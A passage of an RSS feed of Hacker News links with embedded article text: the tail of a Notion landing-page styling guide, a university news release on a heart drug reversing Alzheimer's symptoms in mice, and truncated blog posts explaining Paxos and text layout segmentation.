</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>blue</span><span>:</span><span> #ddebf1</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>purple</span><span>:</span><span> #eae4f2</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>pink</span><span>:</span><span> #f4dfeb</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>red</span><span>:</span><span> #fbe4e4</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>gray</span><span>-</span><span>light</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>235</span><span>,</span><span>236</span><span>,</span><span>237</span><span>,</span><span>0.3</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>brown</span><span>-</span><span>light</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>233</span><span>,</span><span>229</span><span>,</span><span>227</span><span>,</span><span>0.3</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>orange</span><span>-</span><span>light</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>250</span><span>,</span><span>235</span><span>,</span><span>221</span><span>,</span><span>0.3</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>yellow</span><span>-</span><span>light</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>251</span><span>,</span><span>243</span><span>,</span><span>219</span><span>,</span><span>0.3</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>green</span><span>-</span><span>light</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>221</span><span>,</span><span>237</span><span>,</span><span>234</span><span>,</span><span>0.3</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>blue</span><span>-</span><span>light</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>221</span><span>,</span><span>235</span><span>,</span><span>241</span><span>,</span><span>0.3</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>purple</span><span>-</span><span>light</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>234</span><span>,</span><span>228</span><span>,</span><span>242</span><span>,</span><span>0.3</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>pink</span><span>-</span><span>light</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>244</span><span>,</span><span>223</span><span>,</span><span>235</span><span>,</span><span>0.3</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>bg</span><span>-</span><span>red</span><span>-</span><span>light</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>251</span><span>,</span><span>228</span><span>,</span><span>228</span><span>,</span><span>0.3</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>pill</span><span>-</span><span>default</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>206</span><span>,</span><span>205</span><span>,</span><span>202</span><span>,</span><span>0.5</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>pill</span><span>-</span><span>gray</span><span>:</span><span> </span><span>hsla</span><span>(</span><span>45</span><span>,</span><span>2</span><span>%</span><span>,</span><span>60</span><span>%</span><span>,</span><span>0.4</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>pill</span><span>-</span><span>brown</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>140</span><span>,</span><span>46</span><span>,</span><span>0</span><span>,</span><span>0.2</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>pill</span><span>-</span><span>orange</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>245</span><span>,</span><span>93</span><span>,</span><span>0</span><span>,</span><span>0.2</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>pill</span><span>-</span><span>yellow</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>233</span><span>,</span><span>168</span><span>,</span><span>0</span><span>,</span><span>0.2</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>pill</span><span>-</span><span>green</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>0</span><span>,</span><span>135</span><span>,</span><span>107</span><span>,</span><span>0.2</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>pill</span><span>-</span><span>blue</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>0</span><span>,</span><span>120</span><span>,</span><span>223</span><span>,</span><span>0.2</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>pill</span><span>-</span><span>purple</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>103</span><span>,</span><span>36</span><span>,</span><span>222</span><span>,</span><span>0.2</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>pill</span><span>-</span><span>pink</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>221</span><span>,</span><span>0</span><span>,</span><span>129</span><span>,</span><span>0.2</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>pill</span><span>-</span><span>red</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>255</span><span>,</span><span>0</span><span>,</span><span>26</span><span>,</span><span>0.2</span><span>)</span><span>;</span><span>
</span><span>    </span><span>--</span><span>color</span><span>-</span><span>ui</span><span>-</span><span>hover</span><span>-</span><span>bg</span><span>:</span><span> </span><span>rgba</span><span>(</span><span>55</span><span>,</span><span>53</span><span>,</span><span>47</span><span>,</span><span>0.08</span><span>)</span><span>;</span><span>
</span><span>  </span><span>}</span><span>
</span><span></span><span>&lt;</span><span>/</span><span>style</span><span>&gt;</span></code></pre></span></code></pre></div></details><h2><span id="86c16edd25c04182b7d14ae872bed16d"></span><span><span>🍾 Add a pop-up Call-to-Action block</span></span></h2><p><span><span>We've made an opinionated CTA block you can use to ask your user to sign up at some point when they engage with the page. This one is shown 3 seconds after the page is opened (change the "3000" value inside the window.onload to adjust the duration).</span></span></p><div id="735cc70d16a944f19b754c5ed6b73d83"><picture><source srcset="https://api.super.so/asset/optemization.com/4ec1e65e-e001-4fb2-84f0-b9446ec5b07f.gif?w=750&amp;f=webp" media="(max-width: 414px)" type="image/webp"><source src="https://api.super.so/asset/optemization.com/4ec1e65e-e001-4fb2-84f0-b9446ec5b07f.gif?w=750" media="(max-width: 414px)"><source srcset="https://api.super.so/asset/optemization.com/4ec1e65e-e001-4fb2-84f0-b9446ec5b07f.gif?w=1500&amp;f=webp" type="image/webp"><img src="https://api.super.so/asset/optemization.com/4ec1e65e-e001-4fb2-84f0-b9446ec5b07f.gif?w=1500" alt="image" loading="lazy"></picture></div><p><span><span>Simply include the following script in your Super or Fruition "Inject scripts" section, similar to how you included analytics:</span></span></p><pre id="567243414569454490cb895f08584391"><code><span><pre><code><span>&lt;</span><span>script src</span><span>=</span><span>"https://unpkg.com/sweetalert/dist/sweetalert.min.js"</span><span>&gt;</span><span>&lt;</span><span>/</span><span>script</span><span>&gt;</span><span>
</span><span></span><span>// Thanks Sweetalert for the alert! </span><span>
</span><span></span><span>&lt;</span><span>script</span><span>&gt;</span><span>
</span><span></span><span>window</span><span>.</span><span>on…</span></code></pre></span></code></pre></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://optemization.com/notion-landing-page-guide">https://optemization.com/notion-landing-page-guide</a></em></p>]]>
            </description>
            <link>https://optemization.com/notion-landing-page-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-24906774</guid>
            <pubDate>Tue, 27 Oct 2020 12:34:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Research team discovers breakthrough with potential to reverse Alzheimer's]]>
            </title>
            <description>
<![CDATA[
Score 221 | Comments 52 (<a href="https://news.ycombinator.com/item?id=24906758">thread link</a>) | @elorant
<br/>
October 27, 2020 | https://news.ucalgary.ca/news/research-team-discovers-breakthrough-potential-prevent-reverse-alzheimers | <a href="https://web.archive.org/web/*/https://news.ucalgary.ca/news/research-team-discovers-breakthrough-potential-prevent-reverse-alzheimers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            <div>
              <div>

                
                                
                                                  <div>
                                                                                        <p><span><span>A research team at the University of Calgary’s <a href="https://cumming.ucalgary.ca/">Cumming School of Medicine</a> (CSM) led by Dr. S.R. Wayne Chen, PhD, has made an exciting breakthrough with the potential to prevent and reverse the effects of Alzheimer’s disease.</span></span></p>

<p><span><span>The team discovered that limiting the open time of a channel called the ryanodine receptor, which acts like a gateway to cells located in the heart and brain, reverses and prevents progression of Alzheimer’s disease in animal models. They also identified a drug that interrupts the disease process.</span></span></p>

<p><span><span>The effect of giving the drug to animal models was remarkable: After one month of treatment, the memory loss and cognitive impairments in these models disappeared. </span></span></p>

<p><span><span>“The significance of identifying a clinically used drug that acts on a defined target to provide anti-Alzheimer’s disease benefits can’t be overstated,” says Chen, a member of the <a href="https://libin.ucalgary.ca/">Libin Cardiovascular Institute</a> and the <a href="https://hbi.ucalgary.ca/">Hotchkiss Brain Institute</a> at the CSM.&nbsp;</span></span><span lang="EN-US"><span><span><span>Dr. Jinjing Yao, PhD, a student of Chen, is the first author of the study.</span></span></span></span></p>

<p><span><span>The results of this groundbreaking study were recently published in the peer-reviewed journal, <a href="https://www.cell.com/cell-reports/fulltext/S2211-1247(20)31158-X"><em>Cell Reports</em></a>.&nbsp;</span></span></p>

<p><span><span>This work is potentially highly impactful as more than half a million Canadians live with Alzheimer’s disease and other dementias, suffering memory loss and other cognitive impairments with a negative impact on quality of life. </span></span></p>

<h3><strong><span><span><span><span>The science behind the findings</span></span></span></span></strong></h3>

<p><span><span>Previous research has shown that the progression of Alzheimer’s disease is driven by a vicious cycle of the protein amyloid β (Aβ) inducing hyperactivity at the neuron level. However, the mechanism behind this wasn’t fully understood nor were there effective treatments to stop the cycle. &nbsp;</span></span></p>

<p><span><span>Chen’s team used a portion of an existing drug used for heart patients, carvedilol, to treat mice models with Alzheimer’s symptoms. After a month of treatment, researchers tested animal models with very promising results. </span></span></p>

<p><span><span>“We treated them for a month and the effect was quite amazing,” says Chen, explaining the drug was successful in reversing major symptoms of Alzheimer’s disease. “We couldn’t tell the drug-treated disease models and the healthy models apart.” </span></span></p>

<p><span><span>Chen, a Clarivate Highly Cited Researcher, is optimistic about the future of this research, noting the next step will be clinical trials in people.</span></span></p>

<p><em><span><span>Wayne Chen is a professor in the Department&nbsp;of Physiology and Pharmacology, Biochemistry and </span></span><span><span>Molecular Biology at the CSM.&nbsp;</span></span></em><span><span><em><span lang="EN-US"><span><span>Led by the&nbsp;</span></span></span></em><a href="http://www.hbi.ucalgary.ca/"><em><span><span><span><span><span>Hotchkiss Brain Institute</span></span></span></span></span></em></a><em><span lang="EN-US"><span><span>,&nbsp;</span></span></span></em><a href="http://www.ucalgary.ca/research/brain-and-mental-health"><em><span><span><span><span><span>Brain and Mental Health</span></span></span></span></span></em></a><em><span lang="EN-US"><span><span>&nbsp;is one of six research strategies guiding the University of Calgary toward its&nbsp;Eyes High&nbsp;goals. The strategy provides a unifying direction for brain and mental health research at the university.</span></span></span></em></span></span></p>



                                                                                                                                                                                                                                      

  
    

    
  <div data-history-node-id="23525" role="article" about="/news/research-team-discovers-breakthrough-potential-prevent-reverse-alzheimers" typeof="schema:Article">
    <div>
      <div>
                          <div>
            <div>
              <div>
                <div>
                                        <picture>
                <!--[if IE 9]><video style="display: none;"><![endif]-->
              <source srcset="https://news.ucalgary.ca/news/sites/default/files/styles/ucws_image_desktop/public/2020-09/20190911Libin%20Portraits-%20Dr.%20Chen%20-117.jpg?itok=ByB_f0m8 1x" media="all and (min-width: 992px)" type="image/jpeg">
              <source srcset="https://news.ucalgary.ca/news/sites/default/files/styles/ucws_image_tablet/public/2020-09/20190911Libin%20Portraits-%20Dr.%20Chen%20-117.jpg?itok=5tYigcJ8 1x" media="all and (min-width: 768px)" type="image/jpeg">
              <source srcset="https://news.ucalgary.ca/news/sites/default/files/styles/ucws_image_mobile/public/2020-09/20190911Libin%20Portraits-%20Dr.%20Chen%20-117.jpg?itok=-CoV0v5E 1x" media="all and (max-width: 767px)" type="image/jpeg">
            <!--[if IE 9]></video><![endif]-->
            <img src="https://news.ucalgary.ca/news/sites/default/files/styles/ucws_image_desktop/public/2020-09/20190911Libin%20Portraits-%20Dr.%20Chen%20-117.jpg?itok=ByB_f0m8" alt="Dr. Wayne Chen, PhD" title="Dr. Wayne Chen, PhD" typeof="foaf:Image">

  </picture>

                                    </div>
                                  <p>Dr. Wayne Chen, PhD</p>
                                                  <p>Britton Ledingham for the Libin Cardiovascular Institute</p>
                              </div>
            </div>
          </div>
              </div>
          </div>
  </div>


                                                                                    </div>
                
                
              </div>
              
            </div>

          </div>
        </div></div>]]>
            </description>
            <link>https://news.ucalgary.ca/news/research-team-discovers-breakthrough-potential-prevent-reverse-alzheimers</link>
            <guid isPermaLink="false">hacker-news-small-sites-24906758</guid>
            <pubDate>Tue, 27 Oct 2020 12:32:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How you could have come up with Paxos yourself]]>
            </title>
            <description>
<![CDATA[
Score 211 | Comments 50 (<a href="https://news.ycombinator.com/item?id=24906225">thread link</a>) | @todsacerdoti
<br/>
October 27, 2020 | https://explain.yshui.dev/distributed%20system/2020/09/20/paxos.html | <a href="https://web.archive.org/web/*/https://explain.yshui.dev/distributed%20system/2020/09/20/paxos.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>In the field of computer science, the Paxos algorithm is notorious for how difficult it is to understand. I had to learn the Paxos algorithm in my distributed systems class. I even have "implemented" it by translating Leslie Lamport's TLA+ to Python. But I didn't understand it until much much later.</p>

<p>Now I have a better understanding of Paxos than I used to, I want to explain it to other people. Not because I'd like to help people, rather, I find that explaining things is a very good way to find blind spots in my own understanding.</p>

<p>So, where do we start? Personally, I dislike explanations that start with a step-by-step breakdown of the algorithm, followed by a proof of why those steps do what they claim to do. Instead, I much prefer to start with the problem the algorithm tries to solve, then iteratively come up with a solution together with the reader. So that's what I am going to do. And now you understand the title.</p>

<p><em>Small disclaimer:</em> The glossaries used in this article is different from what is commonly used for Paxos. I just picked the ones that made the most sense for my narrative.</p>

<h2 id="the-problem">The problem</h2>

<p>The distributed consensus problem is widely useful, so the reader probably doesn't need to be motivated. Here I will just simply state the problem.</p>

<p>There is a group of agents (let's call them $\sc{CLIENT}s$), who want to choose a number among their selections. Any number is fine, as long as everyone agrees on the same number.</p>

<p>Here, there are a few assumptions we will make to make this problem meaningful:</p>

<ul>
  <li>All the agents - including but not limited to the $\sc{CLIENT}s$, as we will add more types of agents later - are well-behaved. Meaning they all execute the prescribed algorithms faithfully, and don't maliciously try to trick other agents. (If you like jargons: Byzantine failures don't occur.)</li>
  <li>Agents can talk to each other by sending each other messages, but the messages they send to each other could take arbitrarily long before reaching their destination, and might get lost (but never altered).</li>
</ul>

<p>The agents could also "fail". However, failing is equivalent to all messages sent to/from that agent being lost forever. So whether we have this assumption or not won't change the algorithm we come up with.</p>

<p>Also, to not complicate things, we are only solving the "single-round" consensus problem in this article, meaning as the output of this algorithm, all of the $\sc{CLIENT}s$ will get a single number which they agree on.</p>

<h2 id="solution-searching-adventure">Solution searching adventure</h2>

<h3 id="iteration-0">Iteration 0</h3>

<p>When trying to solve a complex problem such as this one, it's usually a good idea to start by simplifying the problem.
As a start, let's just ignore the need to be reliable entirely.</p>

<p>If we throw reliability out the window, it should be easy to come up with a very simple solution: we add an agent (let's call it $\sc{COORDINATOR}$).
The $\sc{CLIENTS}$ send whatever number they pick to the $\sc{COORDINATOR}$ in a $\sc{PROPOSAL}(client_i, x)$ message, where $x$ is the number
proposed by the $i$-th $\sc{CLIENT}$. The $\sc{COORDINATOR}$ picks an arbitrary proposal (say, $x'$),
and informs the other $\sc{CLIENT}s$ about this decision.
Specifically, the $\sc{COORDINATOR}$ will just reply with a $\sc{CHOSEN}(x')$ message to all the $\sc{PROPOSAL}(\ldots)$ messages it has
received and will receive.</p>

<p>If we assume no messages ever get lost, it is quite easy to see that every $\sc{CLIENT}$ will get a number. And because only one number is ever chosen, they will all get the same number.</p>

<p>It is also easy to see why this solution is impractical: it has a single point of failure. Once the singular $\sc{COORDINATOR}$ fails, no further progress can be made.</p>

<h3 id="iteration-1">Iteration 1</h3>

<p>To improve this almost looks easy at first glance: just add more $\sc{COORDINATOR}s$!</p>

<p>Sure, more $\sc{COORDINATOR}s$ would remove the single point of failure. However, if there are more than one $\sc{COORDINATOR}s$, they might individually make different decisions, which results in the $\sc{CLIENT}s$ having disagreement.</p>

<p>What if we let the $\sc{COORDINATOR}s$ reach an agreement among themselves before responding? But wait, doesn't that sound familiar? Having a group of agents reaching an agreement, that's exactly what we added the $\sc{COORDINATOR}s$ to solve. We just made the problem cyclic.</p>

<p>Let's take a step back. Is there a way for the clients to reach an agreement without having the $\sc{COORDINATOR}s$ communicate with each other?</p>

<p>In other words, among the decisions of the $\sc{COORDINATOR}s$, is there an deterministic algorithm to pick out a specific one that is robust against message losses?</p>

<p>This might sound hard, but it's actually quite simple: pick the decision that is backed by more than half of the $\sc{COORDINATOR}s$.</p>

<p>There can't be two decisions both with more than half of the $\sc{COORDINATOR}s$ backing them; and if a decision doesn't have that many $\sc{COORDINATOR}s$ backing it, it won't appear to have more backing $\sc{COORDINATOR}s$ through message losses.</p>

<p>Since this approach resembles a majority vote, let's call $\sc{COORDINATOR}$ decisions $\sc{VOTE}(coord_i, x)$ from now on, where $x$ is the number picked by the $i$-th $\sc{COORDINATOR}$. Each $\sc{COORDINATOR}$ has a single vote, because each of them only makes a single decision.</p>

<p>Obviously, our solution cannot be infinitely reliable. If more than half of the $\sc{COORDINATOR}s$ went down, there will never be a majority reached. But this is already vastly better than our first solution, and the reliability scales with the number of $\sc{COORDINATOR}s$. So we will call it good enough.</p>

<p>Sadly, this solution doesn't actually work: there might not be a majority at all! For example, it's possible that three of the proposals each get a third of the votes. We would have a stalemate in that case.</p>

<h3 id="iteration-2">Iteration 2</h3>

<p>Again, a solution seems straightforward: just try again in case of a stalemate.</p>

<p>But then again, things aren't that simple.</p>

<p>First of all, the $\sc{COORDINATOR}s$ need to be made aware of a retry. Otherwise, because each $\sc{COORDINATOR}$ only has one vote, they won't be able to vote again even if the $\sc{CLIENT}s$ retry.</p>

<p>To do that, we attach an attempt id to all the messages sent. i.e. $\sc{PROPOSAL}(client_i, x)$ becomes $\sc{PROPOSAL}(\#attempt, client_i, x)$, and so forth. Each time a $\sc{CLIENT}$ retries, it bumps $\#attempt$ to the maximum $\#attempt$ it knows of plus 1. And the $\sc{COORDINATOR}s$ should only responds to messages with the most recent $\#attempt$.</p>

<p>Hopefully the intent of the $\#attempt$ number is clear. (<a href="https://github.com/yshui/explain-algorithms/issues/new">Let me know</a> if not.)</p>

<p>Are we good now? Unfortunately, no. Consider this scenario:</p>

<p>There were 2 clients. They proposed their numbers, the $\sc{COORDINATOR}$ voted on them and all agreed on a single number, $x_1$, all is good. But, all of the $\sc{VOTE}(\ldots)$ messages got lost on the way to $client_2$, while $client_1$ received all of the messages just fine. At this point, $client_1$ thought $x_1$ is the number, but $client_2$ went on to retry. The $\sc{COORDINATOR}s$ voted again, and got $x_2$. This time, all the messages sent to $client_1$ got lost.</p>

<p>And behold, we got the two clients to disagree.</p>

<p>There is an important insight to be had here. Whenever a $\sc{COORDINATOR}$, say $coord_i$, sends out a $\sc{VOTE}(\ldots, coord_i, x)$, there is a chance that some $\sc{CLIENT}$ would adopt $x$. If $coord_i$ ever sends out two votes with different $x$, there is a chance that some of the $\sc{CLIENT}s$ would disagree.</p>

<p>In other words, once a $\sc{COORDINATOR}$ has revealed its vote, it has to stick to it.</p>

<p>This seems to run contrary to our attempt: if the $\sc{COORDINATOR}s$ cannot change their votes, what's the point of retrying? A stalemate will be a stalemate forever.</p>

<p>Looks like we reached a dead end with this type of voting. It appears the problem stems from the fact that the $\sc{COORDINATOR}s$ have to commit to their votes.</p>

<p>So, what if we introduce a form of non-commitment voting?</p>

<h3 id="iteration-3">Iteration 3</h3>

<p>Let's explore this idea. Say, the $\sc{COORDINATOR}s$ could now send a $\sc{TENTATIVE}\sc{VOTE}(\#attempt, coord_i, x)$ message, to tentatively vote for $x$.</p>

<p>Obviously, the $\sc{CLIENT}s$ couldn't adopt $x$ right away. So what's this vote good for?</p>

<p>Ah, right, it could get us to a majority.</p>

<p>It is correct that tentative votes don't lead directly to an agreement among $\sc{CLIENT}s$, but it can show us when a majority has formed among the $\sc{COORDINATOR}s$.</p>

<p>Once a $\sc{CLIENT}$ sees a majority tentative vote, it can then message the $\sc{COORDINATOR}s$ to ask for an actual vote. (Let's call this message $\sc{PLEASE}\sc{VOTE}(\#attempt, client_i)$). Intuitively, the $\sc{COORDINATOR}s$ have to make the same vote in the actual vote as their tentative votes.</p>

<p>If all goes well, we would get a majority and an agreement. If there is no majority, the $\sc{COORDINATOR}s$ won't even start a vote, so they are free to change their mind. So the $\sc{CLIENT}s$ could start another attempt which might have a different outcome.</p>

<p>What if things don't go well? What if the $\sc{PLEASE}\sc{VOTE}$ messages weren't received by some of the $\sc{COORDINATOR}s$?
In that case, some of the $\sc{COORDINATOR}s$ would have voted, and their decisions cannot be changed. That is to say, in all subsequent attempts, these $\sc{COORDINATOR}s$ will always vote for what they have voted for, whether it's a tentative vote, or the actual vote. But that doesn't create a problem for us. There was a majority in the tentative votes, and now we solidified part of the tentative votes. There is at least one way we can still reach a majority in the next round: everyone votes the same as they did in this round. And we can prove this inductively for all future rounds.</p>

<p>From this, we can have a rough image of how the algorithm functions: as attempts are being made, more and more $\sc{COORDINATOR}s$ start to make up their mind which number they will commit to, while making sure a majority could still be reached. Eventually, …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://explain.yshui.dev/distributed%20system/2020/09/20/paxos.html">https://explain.yshui.dev/distributed%20system/2020/09/20/paxos.html</a></em></p>]]>
            </description>
            <link>https://explain.yshui.dev/distributed%20system/2020/09/20/paxos.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24906225</guid>
            <pubDate>Tue, 27 Oct 2020 11:06:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Text layout is a loose hierarchy of segmentation]]>
            </title>
            <description>
<![CDATA[
Score 89 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24906010">thread link</a>) | @adamnemecek
<br/>
October 27, 2020 | https://raphlinus.github.io/text/2020/10/26/text-layout.html | <a href="https://web.archive.org/web/*/https://raphlinus.github.io/text/2020/10/26/text-layout.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>I love text layout, and have been working with it in one form or other for over 35 years. Yet, knowledge about it is quite arcane. I don’t believe there is a single place where it’s all properly written down. I have some explanation for that: while basic text layout is very important for UI, games, and other contexts, a lot of the “professional” needs around text layout are embedded in <em>much</em> more complicated systems such as Microsoft Word or a modern Web browser.</p>

<p>A complete account of text layout would be at least a small book. Since there’s no way I can write that now, this blog post is a small step towards that – in particular, an attempt to describe the “big picture,” using the conceptual framework of a “loose hierarchy.” Essentially, a text layout engine breaks the input into finer and finer grains, then reassembles the results into a text layout object suitable for drawing, measurement, and hit testing.</p>

<p>The main hierarchy is concerned with laying out the entire paragraph as a single line of text. Line breaking is also important, but has a separate, parallel hierarchy.</p>

<h2 id="the-main-text-layout-hierarchy">The main text layout hierarchy</h2>

<p>The hierarchy is: paragraph segmentation as the coarsest granularity, followed by rich text style and BiDi analysis, then itemization (coverage by font), then Unicode script, and shaping clusters as the finest.</p>

<p><img src="https://raphlinus.github.io/assets/layout_pyramid.svg" alt="diagram of layout hierarchy"></p>

<h3 id="paragraph-segmentation">Paragraph segmentation</h3>

<p>The coarsest, and also simplest, segmentation task is paragraph segmentation. Most of the time, paragraphs are simply separated by newline (U+000A) characters, though Unicode in its infinite wisdom specifies a number of code point sequences that function as paragraph separators in plain text:</p>

<ul>
  <li>U+000A LINE FEED</li>
  <li>U+000B VERTICAL TAB</li>
  <li>U+000C FORM FEED</li>
  <li>U+000D CARRIAGE RETURN</li>
  <li>U+000D U+000A (CR + LF)</li>
  <li>U+0085 NEXT LINE</li>
  <li>U+2008 LINE SEPARATOR</li>
  <li>U+2009 PARAGRAPH SEPARATOR</li>
</ul>

<p>In rich text, paragraphs are usually indicated through markup rather than special characters, for example <code>&lt;p&gt;</code> or <code>&lt;br&gt;</code> in HTML. But in this post, as in most text layout APIs, we’ll treat rich text as plain text + attribute spans.</p>

<h3 id="rich-text-style">Rich text style</h3>

<p>A paragraph of rich text may contain <em>spans</em> that can affect formatting. In particular, choice of font, font weight, italic or no, and a number of other attributes can affect text layout. Thus, each paragraph is typically broken into a some number of <em>style runs,</em> so that within a run the style is consistent.</p>

<p>Note that some style changes don’t <em>necessarily</em> affect text layout. A classic example is color. Firefox, rather famously, does <em>not</em> define segmentation boundaries here for color changes. If a color boundary cuts a ligature, it uses fancy graphics techiques to render parts of the ligature in different color. But this is a subtle refinement and I think not required for basic text rendering. For more details, see <a href="https://gankra.github.io/blah/text-hates-you/">Text Rendering Hates You</a>.</p>

<h3 id="bidirectional-analysis">Bidirectional analysis</h3>

<p>Completely separate from the style spans, a paragraph may in general contain both left-to-right and right-to-left text. The need for bidirectional (BiDi) text is certainly one of the things that makes text layout more complicated.</p>

<p>Fortunately, this part of the stack is defined by a standard (<a href="http://www.unicode.org/reports/tr9/">UAX #9</a>), and there are a number of good implementations. The interested reader is referred to <a href="https://www.w3.org/International/articles/inline-bidi-markup/uba-basics">Unicode Bidirectional Algorithm basics</a>. The key takeaway here is that BiDi analysis is done on the plain text of the entire paragraph, and the result is a sequence of <em>level runs,</em> where the level of each run defines whether it is LTR or RTL.</p>

<p>The level runs and the style runs are then merged, so that in subsequent stages each run is of a consistent style and directionality. As such, for the purpose of defining the hierarchy, the result of BiDi analysis could alternatively be considered an implicit or derived rich text span.</p>

<p>In addition to BiDi, which I consider a basic requirement, a more sophisticated text layout engine will also be able to handle vertical <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/writing-mode">writing modes</a>, including mixed cases where short strings are horizontal within the vertical primary direction. Extremely sophisticated layout engines will also be able to handle ruby text and other ways of annotating the main text flow with intercalated strings. See <a href="https://www.w3.org/TR/jlreq/">Requirements for Japanese Text Layout</a> for many examples of sophisticated layout requirements; the scope of this blog post really is basic text layout of the kind needed in user interfaces.</p>

<h3 id="itemization-font-coverage">Itemization (font coverage)</h3>

<p>Itemization is the trickiest and least well specified part of the hierarchy. There is no standard for it, and no common implementation. Rather, each text layout engine deals with it in its own special way.</p>

<p>Essentially, the result of itemization is to choose a single concrete font for a run, from a <em>font collection.</em> Generally a font collection consists of a main font (selected by font name from system fonts, or loaded as a custom asset), backed by a <em>fallback stack,</em> which are usually system fonts, but thanks to <a href="https://www.google.com/get/noto/">Noto</a> it is possible to bundle a fallback font stack with an application, if you don’t mind spending a few hundred megabytes for the assets.</p>

<p>Why is it so tricky? A few reasons, which I’ll touch on.</p>

<p>First, it’s not so easy to determine whether a font can render a particular string of text. One reason is <a href="https://unicode.org/reports/tr15/">Unicode normalization</a>. For example, the string “é” can be encoded as U+00E9 (in NFC encoding) or as U+0065 U+0301 (in NFD encoding). Due to the principle of <a href="https://en.wikipedia.org/wiki/Unicode_equivalence">Unicode equivalence</a>, these should be rendered identically, but a font may have coverage for only one or the other in its <a href="https://docs.microsoft.com/en-us/typography/opentype/spec/cmap">Character to Glyph Index Mapping</a> (cmap) table. The shaping engine has all the Unicode logic to handle these cases.</p>

<p>Of course, realistic fonts with Latin coverage will have both of these particular sequences covered in the cmap table, but edge cases certainly do happen, both in extended Latin ranges, and other scripts such as Hangul, which has complex normalization rules (thanks in part to a Korean standard for normalization which is somewhat at odds with Unicode). It’s worth noting that <a href="https://devblogs.microsoft.com/oldnewthing/20201009-00/?p=104351">DirectWrite gets Hangul normalization quite wrong</a>.</p>

<p>I believe a similar situation exists with the Arabic presentation forms; see <a href="https://www.arabeyes.org/Developing_Arabic_fonts">Developing Arabic fonts</a> for more detail on that.</p>

<p>Because of these tricky normalization and presentation issues, the most robust way to determine whether a font can render a string is to try it. This is how LibreOffice has worked for a while, and in 2015 <a href="https://lists.freedesktop.org/archives/harfbuzz/2015-October/005168.html">Chromium followed</a>. See also <a href="https://www.chromium.org/teams/layout-team/eliminating-simple-text">Eliminating Simple Text</a> for more background on the Chromium text layout changes.</p>

